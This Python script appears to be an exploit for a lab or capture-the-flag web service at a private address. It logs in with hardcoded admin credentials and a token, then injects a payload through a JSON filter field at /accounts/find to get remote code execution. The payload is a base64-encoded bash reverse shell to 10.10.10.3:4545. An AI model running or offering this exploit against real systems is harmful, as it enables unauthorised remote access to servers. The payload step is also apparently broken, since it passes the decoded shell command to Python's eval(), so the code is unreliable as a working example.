import requests
import json
import re
import base64

target = "http://10.10.10.4:8080/"

usr = "admin"

def pwn():
	# authenticated remote code execution "/accounts/find"
	headers = {'Content-type': 'application/json', 'Accept': '*/*'}

	data0 = {
	"auth":{
		"user": f"{usr}",
		"password": "pwned",
		},
		"csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
	}

	data = json.dumps(data0)
	
	r1 = requests.post(target+"auth/check", data=data, verify=False, allow_redirects=False, headers=headers)	
	

	if "true" in r1.text:
		print("[*] logged in successfully")
		#while True:
		cmd = 'bash -i >& /dev/tcp/10.10.10.3/4545 0>&1'.encode('utf-8')
		command = base64.b64encode(cmd)
		print("\t")
		cookie = r1.cookies["40d1b2d83998fabacb726e5bc3d22129"]
		payload = f"die(`{eval(base64.b64decode(command))}`)" # ip and port = sys.argv
		data1 = {
		"options":{
			"filter":{
				f"' + {payload} + '":0
				}
			}
		}

		data2 = json.dumps(data1)
		r = requests.post(target+"accounts/find", data=data2,cookies={"40d1b2d83998fabacb726e5bc3d22129":cookie}, headers=headers, allow_redirects=False, verify=False)
		print(r.text)
pwn()